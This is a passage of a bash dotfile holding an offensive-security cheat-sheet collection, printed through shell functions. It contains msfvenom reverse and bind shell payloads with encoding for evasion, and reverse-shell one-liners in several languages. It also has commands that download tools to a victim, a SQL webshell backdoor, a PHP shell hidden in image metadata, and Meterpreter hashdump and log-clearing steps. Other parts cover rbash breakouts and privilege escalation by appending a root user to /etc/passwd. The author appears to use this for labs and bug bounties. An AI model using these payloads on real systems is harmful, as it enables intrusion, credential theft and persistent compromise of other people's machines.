    RESET="\033[0m"

    echo -e "
${RED}bringmeit:${RESET} ${CYAN}<exploit_path>${RESET}
${GREEN}my_crtsh:${RESET} ${CYAN}<domain>${RESET}
${YELLOW}my_certspotter:${RESET} ${CYAN}<domain>${RESET}
${BLUE}my_crtshprobe:${RESET} ${CYAN}<domain>${RESET}
${PURPLE}my_ipinfo:${RESET} ${CYAN}<IP>${RESET}
${CYAN}my_local_ip:${RESET} ${CYAN}No parameters${RESET}
${WHITE}my_bash:${RESET} ${CYAN}No parameters${RESET}
${RED}my_subdomain_enum:${RESET} ${CYAN}<domain>${RESET}
${GREEN}my_aquatone:${RESET} ${CYAN}<urls_file>${RESET}
${YELLOW}my_waymore:${RESET} ${CYAN}<domain>${RESET}
${BLUE}my_paramspider:${RESET} ${CYAN}<target_list_file>${RESET}
${PURPLE}my_paramspider_one:${RESET} ${CYAN}<target>${RESET}
${CYAN}my_arjun_one:${RESET} ${CYAN}<url> <http_method> <output_file>${RESET}
${WHITE}my_arjun_many:${RESET} ${CYAN}<input_file> <http_method> <output_file>${RESET}
${RED}my_getjs:${RESET} ${CYAN}<target_list_file>${RESET}
${GREEN}my_getjs_one:${RESET} ${CYAN}<url>${RESET}
${YELLOW}my_getjs_katana:${RESET} ${CYAN}<domains_list_file>${RESET}
${BLUE}my_subjs:${RESET} ${CYAN}<urls_file>${RESET}
${PURPLE}my_secretfinder:${RESET} ${CYAN}<urls_file>${RESET}
${CYAN}my_secretfinder_nuclei:${RESET} ${CYAN}<js_file>${RESET}
${WHITE}my_xnlinkfinder:${RESET} ${CYAN}<urls> <subdomains_with_http> <subdomains_without_http>${RESET}
${RED}my_xnlinkfinder_domains:${RESET} ${CYAN}<urls> <subdomains_with_http> <subdomains_without_http>${RESET}
${GREEN}my_linkfinder_html:${RESET} ${CYAN}<url>${RESET}
${YELLOW}my_linkfinder_cli:${RESET} ${CYAN}<url>${RESET}
${BLUE}my_js_analysis:${RESET} ${CYAN}<url>${RESET}
${PURPLE}my_url_tracker:${RESET} ${CYAN}No parameters${RESET}
${CYAN}my_nuclei:${RESET} ${CYAN}<target_list_file>${RESET}
${WHITE}my_nuclei_one:${RESET} ${CYAN}<url>${RESET}
${RED}my_nuclei_sqli:${RESET} ${CYAN}<target_list_file>${RESET}
${GREEN}my_nuclei_xss:${RESET} ${CYAN}<target_list_file>${RESET}
${YELLOW}my_nuclei_crlf:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_nuclei_exposed:${RESET} ${CYAN}<target_list_file>${RESET}
${PURPLE}my_nuclei_header_injection:${RESET} ${CYAN}<target_list_file>${RESET}
${CYAN}my_nuclei_lfi:${RESET} ${CYAN}<target_list_file>${RESET}
${WHITE}my_nuclei_open_redirect:${RESET} ${CYAN}<target_list_file>${RESET}
${RED}my_nuclei_rfi:${RESET} ${CYAN}<target_list_file>${RESET}
${GREEN}my_nuclei_ssi_injection:${RESET} ${CYAN}<target_list_file>${RESET}
${YELLOW}my_nuclei_ldap_injection:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_nuclei_complete:${RESET} ${CYAN}<target_list_file>${RESET}
${PURPLE}my_dirsearch:${RESET} ${CYAN}<host> <extension>${RESET}
${CYAN}my_keyhacks:${RESET} ${CYAN}No parameters${RESET}
${WHITE}my_notify:${RESET} ${CYAN}<message>${RESET}
${RED}my_xss_dalfox:${RESET} ${CYAN}<urls_file>${RESET}
${GREEN}my_xss_blind:${RESET} ${CYAN}<urls_file> <blind_xss_payload>${RESET}
${YELLOW}my_xss_kxss:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_xss_gxss:${RESET} ${CYAN}<urls_file>${RESET}
${PURPLE}my_combined_xss:${RESET} ${CYAN}<urls_file>${RESET}
${CYAN}my_lfi_dotdotpwn:${RESET} ${CYAN}<url>${RESET}
${WHITE}my_lfi_ffuf:${RESET} ${CYAN}<urls_file> <wordlist>${RESET}
${RED}my_lfi_jopmanager:${RESET} ${CYAN}<urls_file>${RESET}
${GREEN}my_lfi_many_paths:${RESET} ${CYAN}<urls_file> <paths_list>${RESET}
${YELLOW}my_lfi_one_path:${RESET} ${CYAN}<urls_file> <path>${RESET}
${BLUE}my_combined_lfi:${RESET} ${CYAN}<urls_file> <paths_list>${RESET}
${PURPLE}my_sqli_sqlmap:${RESET} ${CYAN}<urls_file>${RESET}
${CYAN}my_sqli_httpx:${RESET} ${CYAN}<urls_file>${RESET}
${WHITE}my_combined_sqli:${RESET} ${CYAN}<urls_file>${RESET}
${RED}my_ssrf_detection:${RESET} ${CYAN}<urls_file> <burp_collaborator_url>${RESET}
${GREEN}my_xxe_detection:${RESET} ${CYAN}<urls_file> <xxe_payload>${RESET}
${YELLOW}my_smuggling_smuggler:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_cors:${RESET} ${CYAN}<urls_file>${RESET}
${PURPLE}my_open_redirect:${RESET} ${CYAN}<urls_file>${RESET}
${CYAN}my_os_injection_httpx:${RESET} ${CYAN}<urls_file>${RESET}
${WHITE}my_ldap_injection:${RESET} ${CYAN}<urls_file>${RESET}
${RED}my_mix_ffuf:${RESET} ${CYAN}<urls_file>${RESET}
${GREEN}my_send_to_burpsuite:${RESET} ${CYAN}<urls_file>${RESET}
${YELLOW}my_apk_extract_juicy:${RESET} ${CYAN}<apk_file>${RESET}
${BLUE}my_combined_vuln_detection:${RESET} ${CYAN}<urls_file>${RESET}
"
}

my_todo(){
echo -e "${RED}
- Organise my help commands in the /root/referencestuffs directory
- PWDed 400 Machines + recorde videos or walkthroguh on my website!!
- I should improve my metasploit help commands
- create a pivoting help commands
- 
${RESET}"
}

my_terminator_help(){
echo -e "${BLUE}
New window	 	Shift+Ctrl+I
New Tab			Shift+Ctrl+T
Split terminal		Shift+Ctrl+O/E
Close window	 	Shift+Ctrl+Q
Close terminal	 	Shift+Ctrl+W
Toggle fullscreen	F11
Resize terminal		Shift+Ctrl+<Arrow>
Zoom terminal	 	Shift+Ctrl+Z
Maximise terminal	Shift+Ctrl+X
Reset			Shift+Ctrl+R
Reset + Clear		Shift+Ctrl+G
Begin search		Shift+Ctrl+F
${RESET}"
}

my_methodology(){
echo -e "
${BLUE}
### Methodology: testing a website ###
1. Gather subdomains
2. take screenshots
3. gather urls
4. gather parameters
5. gather js files
6. search in js file for
	- sensitive infos
	- urls
7. nuclei templates for 
	- sqli
	- xss
	- ssrf
	- template injection
	- others
8. nuclei templates in general
9. oneliner

### Methodology: parameters bruteforcing! ###
1. get possible parameters from xnlinkfinder
2. pass the parameter to arjun 
3. test them!

### Methodology: parameters bruteforcing! ###
- jsmon
- url-tracker
${RESET}

"
}

my_colors(){
echo -e "
Text Color:

Black: \e[30m
Red: \e[31m
Green: \e[32m
Yellow: \e[33m
Blue: \e[34m
Magenta: \e[35m
Cyan: \e[36m
White: \e[37m
Text Styles:

Reset: \033[0m
Bold: \e[1m
Underline: \e[4m
Blink: \e[5m
Reverse: \e[7m
\033[0m
"
}

my_commands(){
echo -e "
${BLUE}
my_bugbounty_commands
my_bugbounty_commands_summary
my_bugbounty_commands_summary_colored
my_methodology
my_colors
my_commands
my_venomref
my_common
my_metasploit
my_reverseshell
my_breakout
my_terminator_help
my_todo
${RESET}
"
}

my_venomref(){
echo -e "
${YELLOW}================================================================================${RESET}
${CYAN}WINDOWS/SHELL/REVERSE_TCP [PORT 443]${RESET}
msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86 shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

${CYAN}WINDOWS/SHELL_REVERSE_TCP (NETCAT x86) [PORT 443]${RESET}
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

${CYAN}WINDOWS/SHELL_REVERSE_TCP (NETCAT x64) [PORT 443]${RESET}
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

${CYAN}WINDOWS/METERPRETER/REVRESE_TCP (x86) [PORT 443]${RESET}
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

${CYAN}WINDOWS/METERPRETER/REVRESE_TCP (x64) [PORT 443] AT 10.0.0.67:${RESET}
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_64.exe

${CYAN}---===BIND SHELL, ENCODED, ON PORT 1234===---${RESET}
msfvenom -p windows/shell_bind_tcp LHOST=10.0.0.67 LPORT=1234 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o bindshell_1234_encoded_86.exe

${CYAN}Code for encoding:${RESET}
--platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o payload_86.exe
================================================================================
${CYAN}[+ Binaries LINUX | WINDOWS | MacOS ]${RESET}
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho

${CYAN}[+ Shellcode LINUX | WINDOWS | MacOS ]${RESET}
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=80 EXITFUNC=thread -f python -a x86 --platform windows -b '\x00' -e x86/shikata_ga_nai

${CYAN}NETCAT${RESET}
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.67 LPORT=1234 -f elf >reverse.elf
================================================================================
${CYAN}[+ Scripting Payloads - Python | Bash | Perl ]${RESET}
msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
================================================================================
${RED}[+ PHP ]${RESET}
${CYAN}PHP/METERPRETER_REVERSE_TCP [PORT 443]${RESET}
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\\\n' > shell.php && pbpaste >> shell.php

${CYAN}PHP/METERPRETER/REVERSE_TCP [PORT 443]${RESET}
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\\\n' > shell.php && pbpaste >> shell.php

${CYAN}PHP/REVERSE_PHP [PORT 443]${RESET}
msfvenom -p php/reverse_php LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\\\n' > shell.php && pbpaste >> shell.php

${RED}[+ ASP ]${RESET}
${CYAN}ASP-REVERSE-PAYLOAD [PORT 443]${RESET}
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 -f asp > shell.asp

${CYAN}OR FOR NETCAT [PORT 443]${RESET}
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 -f asp > shell.asp
================================================================================
${CYAN}[+ Client-Side, Unicode Payload - For use with Internet Explorer and IE]${RESET}
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e generic/none
#Note: To keep things the same size, if needed add NOPs at the end of the payload.
#A Unicode NOP is - %u9090
================================================================================
${CYAN}# DLL HiJacking - Windows - x64${RESET}
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.190 LPORT=4444 -f dll -o Printconfig.dll
================================================================================
"
}

my_bufferOverflow(){
echo "
# Generating Payload Pattern & Calculating Offset
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 'EIP_VALUE'
"
}

my_common(){
IP='target-ip'
URL='target-url'
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}================================================================================
===Nmap====${RESET}
nmap -p- -sT -sV -A $IP
nmap -p- -sC -sV $IP --open
nmap -p- --script=vuln $IP
nmap –script *ftp* -p 21 $IP
${CYAN}###HTTP-Methods${RESET}
nmap --script http-methods --script-args http-methods.url-path='/website' 
###  --script smb-enum-shares
${CYAN}sed IPs:${RESET}
grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' FILE
${BLUE}================================================================================
===NFS Exported Shares${RESET}
showmount -e $IP
mount $IP:/vol/share /mnt/nfs -nolock
${BLUE}================================================================================
===RPC / NetBios (137-139) / SMB (445)${RESET}
rpcinfo -p $IP
nbtscan $IP

${CYAN}#list shares${RESET}
smbclient -L //$IP -U ''

${CYAN}# null session${RESET}
rpcclient -U '' $IP
smbclient -L //$IP
enum4linux $IP
${BLUE}================================================================================
===Cracking Web Forms with Hydra${RESET}
https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force

hydra 10.10.10.52 -l username -P /usr/share/wordlists/list 10.0.0.1 ftp
${BLUE}================================================================================
===Compiling Code From Linux${RESET}
${CYAN}# Windows${RESET}
i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
${CYAN}# Linux${RESET}
gcc -m32|-m64 -o output source.c

${CYAN}# Compiling Assembly from Windows${RESET}
# https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D
nasm -f win64 .\hello.asm -o .\hello.obj
# http://www.godevtool.com/Golink.zip
GoLink.exe -o .\hello.exe .\hello.obj
${BLUE}================================================================================
===Cracking a ZIP Password${RESET}
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
${BLUE}================================================================================
===Port forwarding${RESET}
https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
${BLUE}================================================================================
===Setting up Simple HTTP server${RESET}
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -r webrick -e 'WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start'
php -S 0.0.0.0:80
${BLUE}================================================================================
===Uploading Files to Target Machine${RESET}
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
python -c \"from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')\"
powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file.exe','file.exe');
wget http://$ATTACKER/file
curl http://$ATTACKER/file -O
scp ~/file/file.bin user@$IP:tmp/backdoor.py
# Attacker
nc -l -p 4444 < /tool/file.exe
# Victim
nc $ATTACKER 4444 > file.exe
${BLUE}================================================================================
===Converting Python to Windows Executable (.py -> .exe)${RESET}
python pyinstaller.py --onefile convert-to-exe.py
${BLUE}================================================================================
===WPScan & SSL${RESET}
wpscan --url $URL --disable-tls-checks --enumerate p, t, u

${CYAN}===WPScan Brute Forceing:${RESET}
wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt

${CYAN}===Aggressive Plugin Detection:${RESET}
wpscan --url $URL --enumerate p --plugins-detection aggressive

${CYAN}===cmsmap -- (W)ordpress, (J)oomla or (D)rupal or (M)oodle${RESET}
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
================================================================================
${BLUE}===Nikto with SSL and Evasion${RESET}
nikto --host $IP -ssl -evasion 1
SEE EVASION MODALITIES.
${BLUE}================================================================================
===dns_recon${RESET}
dnsrecon –d yourdomain.com
${BLUE}================================================================================
===gobuster directory${RESET}
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30

${CYAN}===gobuster files${RESET}
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30

${CYAN}===gobuster for SubDomain brute forcing:${RESET}
gobuster dns -d domain.org -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
'just make sure any DNS name you find resolves to an in-scope address before you test it'
${BLUE}================================================================================
===Extract IPs from a text file${RESET}
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt
${BLUE}================================================================================
===Wfuzz XSS Fuzzing${RESET}
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt '$URL'
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt '$URL'

${CYAN}===COMMAND INJECTION WITH POST DATA${RESET}
wfuzz -c -z file,/opt/SecLists/Fuzzing/command-injection-commix.txt -d 'doi=FUZZ' '$URL'

${CYAN}===Test for Paramter Existence!${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt '$URL'

${CYAN}===AUTHENTICATED FUZZING DIRECTORIES:${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d 'SESSIONID=value' '$URL'

${CYAN}===AUTHENTICATED FILE FUZZING:${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d 'SESSIONID=value' '$URL'

${CYAN}===FUZZ Directories:${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 '$URL'

${CYAN}===FUZZ FILES:${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 '$URL'
|
${CYAN}LARGE WORDS:${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-words.txt --hc 404 '$URL'
|
${CYAN}USERS:${RESET}
wfuzz -c -z file,/opt/SecLists/Usernames/top-usernames-shortlist.txt --hc 404,403 '$URL'
${BLUE}================================================================================
===ffuf ${RESET}
ffuf -w /path/to/wordlist -u https://target/FUZZ
ffuf -w /path/to/vhost/wordlist -u https://target -H 'Host: FUZZ'
https://github.com/vavkamil/awesome-bugbounty-tools#fuzzing
${BLUE}================================================================================
===dirsearch ${RESET}
# -e for extension 
# -t for threads 
# --proxy=http://127.0.0.1:8080
# --recursive
# --random-agents
# --exclude-status=400,403,404
python3 dirsearch.py -u https://target-website.local -w wordlist -e txt,xml,php
${BLUE}================================================================================
===Command Injection with commix, ssl, waf, random agent ${RESET}
commix --url='https://supermegaleetultradomain.com?parameter=' --level=3 --force-ssl --skip-waf --random-agent
${BLUE}================================================================================
===SQLMap${RESET}
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
/SecLists/Fuzzing/alphanum-case.txt
${BLUE}================================================================================
===Social Recon${RESET}
theharvester -d domain.org -l 500 -b google
${BLUE}================================================================================
===Nmap HTTP-methods${RESET}
nmap -p80,443 --script=http-methods  --script-args http-methods.url-path='/directory/goes/here'
${BLUE}================================================================================
===SMTP USER ENUM${RESET}
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
${BLUE}================================================================================
===Command Execution Verification - [Ping check]${RESET}
===
crackmapexec 192.168.1.5 -u Administrator -p 'PASS' -x whoami
crackmapexec 192.168.1.5 -u 'Administrator' -p 'PASS' --lusers
crackmapexec 192.168.1.0/24 -u 'Administrator' -p 'PASS' --local-auth --sam

====

====
#INTO OUTFILE D00R
SELECT '' into outfile '/var/www/WEROOT/backdoor.php';
${BLUE}================================================================================
====LFI?${RESET}
#PHP Filter Checks.
php://filter/convert.base64-encode/resource=
${BLUE}================================================================================
====UPLOAD IMAGE?${RESET}
GIF89a1
file.php -> file.jpg
file.php -> file.php.jpg
file.asp -> file.asp;.jpg
file.gif (contains php code, but starts with string GIF/GIF98)
00%
file.jpg with php backdoor in exif 
	exiv2 -c'A \"<?php system($_REQUEST['cmd']);?>\"!' backdoor.jpeg
	exiftool '-comment<=back.php' back.png
.jpg -> proxy intercept -> rename to .php
"
}

my_metasploit(){
echo -e "
${YELLOW}================================================================================${RESET}
msf> search platform:windows port:135 target:XP type:exploit
${BLUE}================================================================================
===Meterpreter Cheat Sheet${RESET}
upload file c:\\windows
download c:\\windows\\\repair\\sam /tmp
execute -f c:\\windows\\\temp\\exploit.exe
execute -f cmd -c
ps
shell
edit      	# Edit a file in vi editor
getsystem
migrate 
clearev      	# Clear the system logs
hashdump
getprivs    	# Shows multiple privileges as possible
portfwd add –l 3389 –p 3389 –r target
portfwd delete –l 3389 –p 3389 –r target
${BLUE}================================================================================
===Metasploit Modules${RESET}
use exploit/windows/local/bypassuac
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/jboss_vulnscan
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mysql/mysql_version
post/windows/manage/powershell/exec_powershell
use exploit/multi/http/jboss_maindeployer
use exploit/windows/mssql/mssql_payload
run post/windows/gather/win_privs
use post/windows/gather/credentials/gpp
use post/windows/gather/hashdump
${BLUE}================================================================================
=====Metasploit Modules
===Mimikatz/kiwi${RESET}
load kiwi
creds_all
run post/windows/gather/local_admin_search_enum
set AUTORUNSCRIPT post/windows/manage/migrate
${BLUE}================================================================================
===Meterpreter Payloads${RESET}
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD='net localgroup administrators shaun /add' -f exe > pay.exe
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe -x teamviewer.exe > encoded.exe
"
}

my_breakout(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}================================================================================
===repair the shell after nc connection${RESET}
python -c 'import pty; pty.spawn(\"/bin/bash\")'
# OR
python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Keyboard Shortcut: Ctrl + Z (Background Process.)
stty raw -echo ; fg ; reset
stty columns 200 rows 200
${BLUE}================================================================================
===rbash - Is this rbash (Restricted Bash)?${RESET}
$ vi
:set shell=/bin/sh
:shell

$ vim
:set shell=/bin/sh
:shell
${BLUE}================================================================================
===perl - Is perl present on the target machine?${RESET}
perl -e 'exec \"/bin/bash\";'
perl -e 'exec \"/bin/sh\";'
${BLUE}================================================================================
===AWK - Is AWK present on the target machine?${RESET}
awk 'BEGIN {system(\"/bin/bash -i\")}'
awk 'BEGIN {system(\"/bin/sh -i\")}'
${BLUE}================================================================================
===ed - Is ed present on the target machines?${RESET}
ed
!sh
${BLUE}================================================================================
===IRB - IRB Present on the target machine?${RESET}
exec '/bin/sh'
${BLUE}================================================================================
===Nmap - Is Nmap present on the target machine?${RESET}
nmap --interactive
nmap> !sh
${BLUE}================================================================================${RESET}
"
}


## reverseshell:
my_reverseshell(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUEBOLD}======Bash${RESET}"
echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"

echo -e "${BLUEBOLD}======PERL${RESET}"
echo perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

echo -e "${BLUEBOLD}======Python${RESET}"
echo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

echo -e "${BLUEBOLD}======PHP${RESET}"
echo php -r '$sock=fsockopen("10.0.0.1",1w234);exec("/bin/sh -i <&3 >&3 2>&3");'

echo -e "${BLUEBOLD}======Ruby${RESET}"
echo ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

echo -e "${BLUEBOLD}======Netcat${RESET}"
echo nc -e /bin/sh 10.0.0.1 1234

echo -e "${BLUEBOLD}======java${RESET}"
echo 'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();'

echo -e "\n${RED}https://www.revshells.com/${RESET}\n"
}


my_linuxpriv(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}================================================================================
===better shell on target ${RESET}
python -c 'import pty; pty.spawn(\"/bin/bash\")'
OR
python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
${BLUE}================================================================================${RESET}
${BLUE}===kernel?${RESET}
uname -a
cat /etc/*-release
${BLUE}===/etc/passwd writable?${RESET}
ls -lsa /etc/passwd

openssl passwd -1
password123
$1$v6KYhidX$D.NBumRd1Lsr3LCw4mFrj/
echo 'ibrahim:$1$v6KYhidX$D.NBumRd1Lsr3LCw4mFrj/:0:0:ibrahim:/home/ibrahim:/bin/bash' >> /etc/passwd
su ibrahim
id
${BLUE}===sudo?${RESET}
sudo -l
${BLUE}===environmental variables?${RESET}
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
${BLUE}===What has the user being doing? passwords?${RESET}
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
${BLUE}===Private-key information?${RESET}
cd ~/.ssh/
${BLUE}===file-systems mounted?${RESET}
mount
df -h
${BLUE}===Web Configs containing credentials?${RESET}
cd /var/www/html/
ls -lsaht
${BLUE}===SUID Binaries?${RESET}
find / -perm -u=s -type f 2>/dev/null
${BLUE}===GUID Binaries?${RESET}
find / -perm -g=s -type f 2>/dev/null
-> https://gtfobins.github.io/
${BLUE}===any sensitive on?${RESET}
ls -lsaht /opt/
ls -lsaht /tmp/
ls -lsaht /var/tmp/
ls -lsaht /dev/shm/
${BLUE}===What does the local network look like?${RESET}
netstat -antup
netstat -tunlp
${BLUE}===Is anything vulnerable running as root?${RESET}
ps aux |grep -i 'root' --color=auto
${BLUE}===Are there any .secret files?${RESET}
ls -lsaht |grep -i '.secret' --color=aut 2>/dev/null
${BLUE}===cron jobs?${RESET}
crontab –u root –l
cat /etc/fstab
${BLUE}===Look for unusual system-wide cron jobs:${RESET}
cat /etc/crontab
ls /etc/cron.*
${BLUE}===What is every single file ibrahim has ever created?${RESET}
find / -user ibrahim 2>/dev/null
${BLUE}===Any backups??${RESET}
find / -type f \\( -name "*.bak" -o -name "*.sav" -o -name "*.backup" -o -name "*.old" \\) 2>/dev/null
${BLUE}===Any mail? mbox in User \$HOME directory?${RESET}
cd /var/mail/
ls -lsaht
${BLUE}===automation?${RESET}
Linpease
Traitor
${BLUE}===other resources${RESET}
'https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/'
'https://github.com/sleventyeleven/linuxprivchecker'
"
}
